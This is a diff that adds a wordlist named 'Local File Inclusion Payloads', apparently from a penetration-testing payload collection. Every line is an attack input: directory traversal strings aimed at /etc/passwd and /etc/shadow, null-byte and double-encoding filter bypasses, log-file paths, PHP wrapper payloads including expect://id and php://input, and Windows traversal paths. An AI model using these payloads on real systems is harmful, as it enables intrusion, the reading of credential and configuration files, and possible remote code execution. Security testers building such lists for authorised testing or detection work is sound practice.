@@ -1,0 +1,42 @@
+# Local File Inclusion Payloads
+
+# Basic Unix
+../../../etc/passwd
+../../../../etc/passwd
+../../../../../etc/passwd
+../../../../../../etc/passwd
+
+# Null Byte Bypass
+../../../etc/passwd%00
+../../../etc/passwd%00.jpg
+
+# Double Encoding
+..%252f..%252f..%252fetc/passwd
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
+..%2f..%2f..%2fetc/passwd
+
+# Filter Bypass
+....//....//....//etc/passwd
+..../..../..../etc/passwd
+
+# Absolute Path
+/etc/passwd
+/etc/shadow
+/etc/hosts
+/proc/self/environ
+/proc/version
+
+# Log Files
+/var/log/apache2/access.log
+/var/log/nginx/access.log
+/var/log/auth.log
+
+# PHP Wrappers
+php://filter/convert.base64-encode/resource=index.php
+php://input
+expect://id
+
+# Windows
+..\..\..\..\windows\win.ini
+C:\Windows\System32\drivers\etc\hosts
+C:\Windows\win.ini
